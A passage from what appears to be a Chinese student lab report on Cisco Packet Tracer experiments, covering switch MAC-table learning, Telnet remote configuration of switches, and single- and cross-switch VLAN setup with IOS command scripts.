src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-终端B至终端A.png" alt="交换式以太网实验-终端B至终端A"></center><center>图3-3 终端B至终端A</center><p>​    在三个交换机的转发表中均存在终端A对应的转发项的前提下，断开终端A与交换机S1之间的连接，并重新将终端A连接到交换机S3中，并启动终端B至终端A的MAC帧传输过程。（如图3-4所示）</p><ul><li>由于S1的f0/1端口关闭，则到MACA的转发项变成无效转发项，当S1收到终端B的MAC帧后，广播该帧；</li><li>由于S2中仍存在原转发项并认为其有效，当S2收到S1广播的MAC帧时，识别后将其丢弃；</li><li>由于S2中仍存在原转发项并认为其有效，当终端C发送至MACA的帧时，会将其转发给S2，S2再转发给S1，S1广播该帧。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-终端A切换位置.png" alt="交换式以太网实验-终端A切换位置"></center><center>图3-4 终端A切换位置</center><p>​        <font color="blue">解决上述问题的方法有两个：</font></p><ol><li><font color="blue">终端A广播一MAC帧，即发送一帧以终端A的MAC地址为源地址，以广播地址为目的地址的MAC帧；</font></li><li><font color="blue">等到所有交换机的转发表中与终端A的MAC地址匹配的转发项过时。</font></li></ol><h3 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h3><ol><li><p><strong>按照实验要求构建网络拓扑，如图3-5所示</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-构建网络拓扑图.png" alt="交换式以太网实验-构建网络拓扑图"></center><center>图3-5 构建网络拓扑图</center></li><li><p><strong>网络设备基本配置</strong>（IP地址、子网掩码）</p><p>终端A的基本配置，如图3-6所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-终端A基本配置.png" alt="交换式以太网实验-终端A基本配置"></center><center>图3-6 终端A基本配置</center><p><font color="blue">其他终端也依据终端A进行类似配置</font></p></li><li><p><strong>关闭CDP并清空MAC表</strong></p><p>在三个交换机中执行关闭CDP命令和清空MAC表命令，如图3-7所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-停止CDP.png" alt="交换式以太网实验-停止CDP"></center><center>图3-7 停止CDP</center></li><li><p><strong>终端A到终端B、终端C、终端D的MAC帧传输过程</strong></p><p>终端A发送MAC帧到S1，如图3-8所示</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-终端A到S1.png" alt="交换式以太网实验-终端A到S1"></center><center>图3-8 终端A到S1</center><p>S1创建表项并广播MAC帧，如图3-9所示</p></li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-S1广播MAC帧.png" alt="交换式以太网实验-S1广播MAC帧"></center><center>图3-9 S1广播MAC帧</center><p>   S2创建表型并广播MAC帧，当S3接收到MAC帧后，创建表项并广播MAC帧，如图3-10所示</p>   <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-S3广播MAC帧.png" alt="交换式以太网实验-S3广播MAC帧"></center>   <center>图3-10 S3广播MAC帧</center><p>操作完成之后交换机中的MAC表分别为，如图3-11、图3-12、图3-13所示</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-S1MAC表1.png" alt="交换式以太网实验-S1MAC表1"></center><center>图3-11 S1MAC表1</center>   <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-S2MAC表1.png" alt="交换式以太网实验-S2MAC表1"></center>   <center>图3-12 S2MAC表1</center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-S3MAC表1.png" alt="交换式以太网实验-S3MAC表1"></center><center>图3-13 S3MAC表1</center><ol start="5"><li><p><strong>清空S1的转发表</strong>，<strong>如图3-14所示</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-清空S1交换表.png" alt="交换式以太网实验-清空S1交换表"></center><center>图3-14 清空S1交换表</center></li><li><p><strong>终端B向终端A发送MAC帧</strong></p><p>S1接收到终端B发送的MAC帧后，先创建至MACB的表项再广播该MAC帧；S2和S3接收到MAC帧后，先创建至MACB的表项再广播该MAC帧（如下图所示）；终端A接收到该MAC帧后，应答该MAC帧，如图3-15所示</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-终端B向终端A发送MAC帧.png" alt="交换式以太网实验-终端B向终端A发送MAC帧"></center><center>图3-15 终端B向终端A发送MAC帧</center><p>完成上述过程后，各个交换机中的MAC表，如图3-16、图3-17、图3-18所示</p></li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-S1MAC表2.png" alt="交换式以太网实验-S1MAC表2"></center><center>图3-16 S1MAC表2</center>   <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-S2MAC表2.png" alt="交换式以太网实验-S2MAC表2"></center>   <center>图3-17 S2MAC表2</center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-S3MAC表2.png" alt="交换式以太网实验-S3MAC表2"></center><center>图3-18 S3MAC表2</center><ol start="7"><li><p><strong>将终端A重新连接至S3上</strong>，<strong>如图3-19所示</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-终端A重新连接.png" alt="交换式以太网实验-终端A重新连接"></center><center>图3-19 终端A重新连接</center></li><li><p><strong>终端B向终端A发送MAC帧</strong></p><p>S2接收到MAC帧后丢弃该帧，如图3-20所示</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-S2丢弃MAC帧.png" alt="交换式以太网实验-S2丢弃MAC帧"></center><center>图3-20 S2丢弃MAC帧</center></li><li><p><strong>终端C向终端A发送MAC帧</strong>，<strong>如图3-21所示</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-S3转发MAC帧.png" alt="交换式以太网实验-S3转发MAC帧"></center><center>图3-21 S3转发MAC帧</center></li></ol><h2 id="交换机远程配置实验"><a href="#交换机远程配置实验" class="headerlink" title="交换机远程配置实验"></a>交换机远程配置实验</h2><h3 id="实验内容-2"><a href="#实验内容-2" class="headerlink" title="实验内容"></a>实验内容</h3><p>​        构建如图4-1所示的网络结构，实现PC远程配置交换机S1和S2的功能。实际网络环境下，一般首先通过控制台端口完成网络设备基本信息配置过程，如交换机管理接收地址及建立PC与交换机管理接收之间传输通路相关的信息。然后，由PC统一对网络设备实施远程配置。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/网络拓扑.png" alt="网络拓扑"></center><center>图4-1 网络拓扑</center><h3 id="实验目的-2"><a href="#实验目的-2" class="headerlink" title="实验目的"></a>实验目的</h3><ol><li>验证建立PC与交换机S1和S2之间的Telnet报文传输通路的过程</li><li>验证通过Telnet对交换机S1和S2实施远程配置的过程</li></ol><h3 id="实验原理-2"><a href="#实验原理-2" class="headerlink" title="实验原理"></a>实验原理</h3><p>​        通常情况下，远程登录过程中，交换机需要鉴别远程登录用户的身份，因此需要在交换机中配置鉴别信息，交换机通过配置的鉴别信息对用户的身份和配置权限进行鉴别，只有具有配置权限的用户才能对交换机进行远程配置。配置的鉴别信息包括用户名、口令和enable口令。用户名和口令用于鉴别授权用户，enable空灵用于管制用户远程登录配置的权限，如是否允许使用全局模式下的所有配置命令。</p><p><strong>注</strong>：</p><ol><li>需要为每一个交换机定义管理接口，并为管理接口分配IP地址；</li><li>需要保证PC与每一个交换机的管理接口之间的连通性；</li><li>需要启动交换机远程登录功能。</li></ol><h3 id="实验步骤-2"><a href="#实验步骤-2" class="headerlink" title="实验步骤"></a>实验步骤</h3><ol><li><p><strong>按照实验要求构建网络拓扑，如图4-2所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/网络拓扑.png" alt="网络拓扑"></center><center>图4-2 构建网络拓扑</center></li><li><p><strong>对PC进行基本配置（IP地址、子网掩码、默认网关），如图4-3所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/对PC进行基本配置.png" alt="对PC进行基本配置"></center><center>图4-3 对PC进行基本配置</center></li><li><p><strong>对S1交换机进行配置，如图4-4所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/S1配置过程.png" alt="S1配置过程"></center><center>图4-4 S1配置过程</center><p>命令脚本：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t   hostname S1   username <span class="token number">aaa1</span> pass <span class="token number">bbb1</span>   <span class="token keyword">enable</span> pass <span class="token number">ccc1</span>   <span class="token keyword">int</span> vlan <span class="token number">1</span>   ip <span class="token keyword">add</span> <span class="token number">192.1</span><span class="token punctuation">.</span><span class="token number">1.7</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span>   <span class="token keyword">no</span> shut   <span class="token keyword">exit</span>   ip <span class="token keyword">default</span><span class="token operator">-</span>gateway <span class="token number">192.1</span><span class="token punctuation">.</span><span class="token number">1.254</span>   line vty <span class="token number">0</span> <span class="token number">4</span>   login <span class="token keyword">local</span>   <span class="token keyword">exit</span></code></pre><ol start="4"><li><p><strong>对R路由器进行配置，如图4-5所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/R配置过程.png" alt="R配置过程"></center><center>图4-5 R配置过程</center><p>命令脚本：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t   hostname R   nt g0<span class="token operator">/</span><span class="token number">0</span>   p <span class="token keyword">add</span> <span class="token number">192.1</span><span class="token punctuation">.</span><span class="token number">1.254</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span>   <span class="token keyword">no</span> shut   <span class="token keyword">exit</span>   <span class="token keyword">int</span> g0<span class="token operator">/</span><span class="token number">1</span>   ip <span class="token keyword">add</span> <span class="token number">192.1</span><span class="token punctuation">.</span><span class="token number">2.254</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span>   <span class="token keyword">no</span> shut   <span class="token keyword">exit</span></code></pre><ol start="5"><li><p><strong>对S2交换机进行配置，如图4-6所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/S2配置过程.png" alt="S2配置过程"></center><center>图4-6 S2配置过程</center><p>命令脚本：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t   hostname S2   username <span class="token number">aaa2</span> pass <span class="token number">bbb2</span>   <span class="token keyword">enable</span> pass <span class="token number">ccc2</span>   <span class="token keyword">int</span> vlan <span class="token number">1</span>   ip <span class="token keyword">add</span> <span class="token number">192.1</span><span class="token punctuation">.</span><span class="token number">2.7</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span>   <span class="token keyword">no</span> shut   <span class="token keyword">exit</span>   ip <span class="token keyword">default</span><span class="token operator">-</span>gateway <span class="token number">192.1</span><span class="token punctuation">.</span><span class="token number">2.254</span>   line vty <span class="token number">0</span> <span class="token number">4</span>   login <span class="token keyword">local</span>   <span class="token keyword">exit</span></code></pre><ol start="6"><li><p><strong>PC远程登录S1，如图4-7所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/PC远程登录S1.png" alt="PC远程登录S1"></center><center>图4-7 PC远程登录S1</center></li><li><p><strong>PC远程登录S2，如图4-8所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/PC远程登录S2.png" alt="PC远程登录S2"></center><center>图4-8 PC远程登录S2</center></li></ol><h3 id="关键命令说明"><a href="#关键命令说明" class="headerlink" title="关键命令说明"></a>关键命令说明</h3><ol><li><p><strong>配置路由器接口命令，如图4-9所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/配置路由器接口命令.png" alt="配置路由器接口命令"></center><center>图4-9 配置路由器接口命令</center><p>路由器的接口默认时2关闭状态，所以当启动路由器的端口是需要使用<strong>no shutdown</strong>命令。</p></li><li><p><strong>配置交换机管理地址命令，如图4-10所示</strong>。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/配置管理地址命令.png" alt="配置管理地址命令"></center><center>图4-10 配置管理地址命令</center><p>二层交换机的接口不支持配置IP地址，而远程管理交换机就必须使用IP地址，VLAN支持定义IP地址，所以交换机的管理地址即为VLAN 1定义IP接口。</p></li><li><p><strong>配置默认网关地址命令，如图4-11所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/配置默认网关地址命令.png" alt="配置默认网关地址命令"></center><center>图4-11 配置默认网关地址命令</center><p>当PC与交换机的管理接口不属于同一个网络时，需要为交换机配置默认网关地址来指示报文传输方向。</p></li><li><p><strong>配置用户鉴别信息命令</strong></p><ul><li><p>配置用户名和口令，如图4-12所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/配置用户名和口令.png" alt="配置用户名和口令"></center><center>图4-12 配置用户名和口令</center><p>username aaa2 pass bbb2命令，在本地创建一个用户名为aaa2，密码为bbb2的用户</p></li></ul></li></ol><p>enable pass ccc2命令，设置进入特权模式的密码为：ccc2</p><ul><li><p>配置鉴别授权用户方式，如图4-13所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/配置鉴别授权用户方式.png" alt="配置鉴别授权用户方式"></center>   <center>图4-13 配置鉴别授权用户方式</center><p>   允许同时建立5个会话；指定用本地创建的用户名和口令来鉴别登录用户身份。</p></li></ul><h1 id="第3章-虚拟局域网实验"><a href="#第3章-虚拟局域网实验" class="headerlink" title="第3章 虚拟局域网实验"></a>第3章 虚拟局域网实验</h1><p>​        虚拟局域网即（VLAN），是一种在逻辑上划分广播域的技术。集线器和交换机通过中继器理论上可以实现无限远的通信连接，但随着网络的扩大广播域也将扩大（由集线器和中继器相连的区域属于同一个广播域），无限的广播使得大量的带宽资源被浪费，物理上划分的广播域不能满足网络拓扑结构的变化，因此具有很大的限制性。VLAN在逻辑上对广播域进行划分，得到了更优的解决方案。</p><h2 id="单交换机VLAN配置实验"><a href="#单交换机VLAN配置实验" class="headerlink" title="单交换机VLAN配置实验"></a>单交换机VLAN配置实验</h2><h3 id="实验内容-3"><a href="#实验内容-3" class="headerlink" title="实验内容"></a>实验内容</h3><p>​        交换机连接终端和集线器的方式及端口分配给各个VALN的情况如图5-1所示。初始状态下各个VLAN对应的转发表内容为空，依次进行一下①~⑥MAC帧传输过程，，针对每一次MAN帧传输过程，记录下转发表的变化过程及MAC帧达到的终端。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/配置鉴别授权用户方式.png" alt="配置鉴别授权用户方式"></center><center>图5-1 网络拓扑</center><p>① 终端A $\rightarrow$ 终端B</p><p>② 终端B $\rightarrow$ 终端A</p><p>③ 终端E $\rightarrow$ 终端B</p><p>④ 终端B $\rightarrow$ 终端E</p><p>⑤ 终端B发送广播帧</p><p>⑥ 终端F $\rightarrow$ 终端E</p><h3 id="实验目的-3"><a href="#实验目的-3" class="headerlink" title="实验目的"></a>实验目的</h3><ol><li>验证交换机VLAN配置过程</li><li>验证属于同一个VLAN的终端之间的通信过程</li><li>验证每一个VLAN为独立的广播域</li><li>验证属于不同VLAN的两个终端之间不能相互通信</li><li>验证转发项与VLAN之间的对应关系</li></ol><h3 id="实验原理-3"><a href="#实验原理-3" class="headerlink" title="实验原理"></a>实验原理</h3><p>​        默认情况下，交换机所有端口属于默认VLAN—VLAN1，因此，交换机的所有端口属于同一个广播域，任何终端发送的以广播地址为目的的MAC地址的MAC帧到达连接在交换机上的所有终端。由于与计算机端口8连接的是集线器，因此，从端口8输出的MAC帧到达连接在集线器上的所有终端。下表为各MAC帧到达的终端：</p><table><thead><tr><th align="center">MAC帧传输过程</th><th align="center">到达终端</th></tr></thead><tbody><tr><td align="center">终端A $\rightarrow$ 终端B</td><td align="center">终端B、D</td></tr><tr><td align="center">终端B $\rightarrow$ 终端A</td><td align="center">终端A</td></tr><tr><td align="center">终端E $\rightarrow$ 终端B</td><td align="center">终端F、C</td></tr><tr><td align="center">终端B $\rightarrow$ 终端E</td><td align="center">终端A、D</td></tr><tr><td align="center">终端B发送广播帧</td><td align="center">终端A、D</td></tr><tr><td align="center">终端F $\rightarrow$ 终端E</td><td align="center">终端E</td></tr></tbody></table><h3 id="实验步骤-3"><a href="#实验步骤-3" class="headerlink" title="实验步骤"></a>实验步骤</h3><ol><li><p><strong>按照实验要求构建网络拓扑，如图5-2所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/构建网络拓扑.png" alt="构建网络拓扑"></center><center>图5-2 构建网络拓扑</center></li><li><p><strong>对终端进行基本配置（IP地址、子网掩码），如图5-3所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端A基本配置.png" alt="终端A基本配置"></center><center>图5-3 终端A基本配置</center></li><li><p><strong>整个网络在一个广播域中</strong></p><ul><li><p>在终端A上创建复杂报文，如图5-4所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/构造终端A发送的广播报文.png" alt="构造终端A发送的广播报文"></center><center>图5-4 构造终端A发送的广播报文</center></li><li><p>报文广播域，如图5-5所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/报文广播域.png" alt="报文广播域"></center><center>图5-5 报文广播域</center></li><li><p>广播报文的MAC帧，如图5-6所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/广播报文的MAC帧.png" alt="广播报文的MAC帧"></center><center>图5-6 广播报文的MAC帧</center></li></ul></li><li><p><strong>创建并划分VLAN，如图5-7所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/创建并划分VLAN.png" alt="创建并划分VLAN"></center><center>图5-7 创建并划分VLAN</center><p><strong>命令脚本</strong>:</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t   vlan <span class="token number">2</span>   name vlan2   <span class="token keyword">exit</span>   vlan <span class="token number">3</span>   name vlan3   <span class="token keyword">exit</span>   <span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">f0</span><span class="token operator">/</span><span class="token number">5</span>   switchport mode access   switchport access vlan <span class="token number">2</span>   <span class="token keyword">exit</span>   <span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">f0</span><span class="token operator">/</span><span class="token number">8</span>   switchport mode access   switchport access vlan <span class="token number">3</span>   <span class="token keyword">exit</span>   <span class="token keyword">end</span></code></pre><ol start="5"><li><p><strong>终端A $\rightarrow$ 终端B</strong></p><p>由于Switch转发表为空，当Switch接收到终端A发送的MAC帧时，将广播至该VLAN中的其他终端（终端B和终端D），如图5-8所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端A到终端B过程中的广播.png" alt="终端A到终端B过程中的广播"></center><center>图5-8 终端A到终端B过程中的广播</center></li><li><p><strong>终端B $\rightarrow$ 终端A</strong></p><p>由于Switch中存在至MACA的表项，所以当Switch接收到MAC帧时，将单播发送至终端A，如图5-9所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端B至终端A.png" alt="终端B至终端A"></center><center>图5-9 终端B至终端A</center></li><li><p><strong>终端E $\rightarrow$ 终端B</strong></p><p>MAC帧不能发送，如图5-10所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端E至终端B.png" alt="终端E至终端B"></center><center>图5-10 终端E至终端B</center></li><li><p><strong>终端B $\rightarrow$ 终端E</strong></p><p>MAC帧不能发送，如图5-11所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端B至终端E.png" alt="终端B至终端E"></center><center>图5-11 终端B至终端E</center></li><li><p><strong>终端B发送广播帧</strong></p><p>终端A和终端D接收到MAC帧，如图5-12所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端B广播.png" alt="终端B广播"></center><center>图5-12 终端B广播</center></li><li><p><strong>终端F $\rightarrow$ 终端E</strong></p><p>终端E和终端C接收到MAC帧，如图5-13所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端F至终端E.png" alt="终端F至终端E"></center><center>图5-13 终端F至终端E</center></li></ol><h2 id="跨交换机VLAN配置实验"><a href="#跨交换机VLAN配置实验" class="headerlink" title="跨交换机VLAN配置实验"></a>跨交换机VLAN配置实验</h2><h3 id="实验内容-4"><a href="#实验内容-4" class="headerlink" title="实验内容"></a>实验内容</h3><p>​        构建如图6-1所示的物理以太网，将物理以太网划分为三个VLAN，分别是VLAN２、VLAN３和VLAN４，其中终端A、终端B和终端G属于VLAN２，终端E、终端F和终端H属于VLAN３，终端C和终端D属于VLAN４.为了保证属于同一VLAN的终端之间能够相互通信，要求做到以下两点：一是为属于同一VLAN的终端配置有着相同网络号的IP地址；二是建立属于同一VLAN的终端之间的交换路径。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端F至终端E.png" alt="终端F至终端E"></center><center>图6-1 网络拓扑</center><h3 id="实验目的-4"><a href="#实验目的-4" class="headerlink" title="实验目的"></a>实验目的</h3><ol><li>完成复杂交换式以太网设计过程</li><li>实现跨交换机VLAN划分</li><li>验证接入端口和标记端口之间的区别</li><li>验证IEEE802.1q标准MAC帧格式</li><li>验证属于同一VLAN的终端之间的通信过程</li><li>验证属于不同VLAN的两个终端之间不能相互通信</li></ol><h3 id="实验原理-4"><a href="#实验原理-4" class="headerlink" title="实验原理"></a>实验原理</h3><ol><li><p>创建VLAN和为VLAN分配交换机端口过程</p><ul><li><p><strong>端口分配原则</strong></p><p>如果仅仅只有属于单个VLAN的交换路径经过某个交换机端口，将该交换机端口作为接入端口分配给该VLAN；</p><p>如果有属于不同VLAN的多条交换路径经过某个交换机端口，将该交换机端口配置为被这些VLAN共享的共享端口。</p></li><li><p><strong>创建VLAN原则</strong></p><p>如果某个交换机直接连接属于某个VLAN的终端，该交换机中需要创建该VLAN；</p><p>如果某个交换机虽然没有直接连接属于某个VLAN的终端，但有属于该VLAN的交换路径经过该交换机中的端口，该交换机也需要创建该VLAN。</p></li></ul></li><li><p>端口模式与MAC帧格式之间的关系</p><p>从接入端口输入输出的MAC帧不携带VLAN ID，是普通的MAC帧格式。从共享端口输入输出的MAC帧，携带该MAC帧所属VLAN的VLAN ID。MAC帧格式是802.1q标准MAC帧格式。</p></li></ol><h3 id="实验步骤-4"><a href="#实验步骤-4" class="headerlink" title="实验步骤"></a>实验步骤</h3><ol><li><p><strong>按照实验要求构建网络拓扑，如图6-2所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端F至终端E.png" alt="终端F至终端E"></center><center>图6-2 构建网络拓扑</center></li><li><p><strong>对终端设备进行基本配置（IP地址、子网掩码），如图6-3所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端A的基本配置.png" alt="终端A的基本配置"></center><center>图6-3 终端A的基本配置</center><p>对终端A的基本配置如上图所示，其他终端也进行类似配置。</p></li><li><p><strong>S1配置，如图6-4所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/S1配置.png" alt="S1配置"></center><center>图6-4 S1配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t   hostname S1   vlan <span class="token number">2</span>   name vlan2   <span class="token keyword">exit</span>   vlan <span class="token number">4</span>   name vlan4   <span class="token keyword">exit</span>   <span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">2</span>   switchport mode access   switchport access vlan <span class="token number">2</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">3</span>   switchport mode access   switchport access vlan <span class="token number">4</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">4</span>   switchport mode trunk   switchport trunk allowed vlan <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span>   <span class="token keyword">end</span></code></pre><ol start="4"><li><p><strong>S2配置，如图6-5所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/S2配置.png" alt="S2配置"></center><center>图6-5 S2配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t   hostname S2   vlan <span class="token number">2</span>   name vlan2   <span class="token keyword">exit</span>   vlan <span class="token number">3</span>   name vlan3   <span class="token keyword">exit</span>   vlan <span class="token number">4</span>   name vlan4   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span>   switchport mode trunk   switchport trunk allowed vlan <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">2</span>   switchport mode trunk   switchport trunk allowed vlan <span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">3</span>   switchport mode access   switchport access vlan <span class="token number">2</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">4</span>   switchport mode access   switchport access vlan <span class="token number">3</span>   <span class="token keyword">end</span></code></pre><ol start="5"><li><p><strong>S3配置，如图6-6所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/S3配置.png" alt="S3配置"></center><center>图6-6 S3配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t   hostname S3    vlan <span class="token number">3</span>   name vlan3   <span class="token keyword">exit</span>   vlan <span class="token number">4</span>   name vlan4   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span>   switchport mode access   switchport access vlan <span class="token number">4</span>   <span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">3</span>   switchport mode access   switchport access vlan <span class="token number">3</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">4</span>   switchport mode trunk   switchport trunk allowed vlan <span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span>   <span class="token keyword">end</span></code></pre><ol start="6"><li><p><strong>终端C至终端D的传输</strong></p><p>由于交换机S1的f0/4端口是被VLAN2和VLAN4共享的共享端口，因此，该帧经过交换机S1的f0/4端口输出时，携带VLAN4对应的VLAN ID（4），其数据帧格式如图6-7所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端C至终端D（VLAN ID）.png" alt="终端C至终端D（VLAN ID）"></center><center>图6-7 终端C至终端D（VLAN ID）</center></li></ol><h2 id="交换机VLAN远程配置实验"><a href="#交换机VLAN远程配置实验" class="headerlink" title="交换机VLAN远程配置实验"></a>交换机VLAN远程配置实验</h2><h3 id="实验内容-5"><a href="#实验内容-5" class="headerlink" title="实验内容"></a>实验内容</h3><p>​        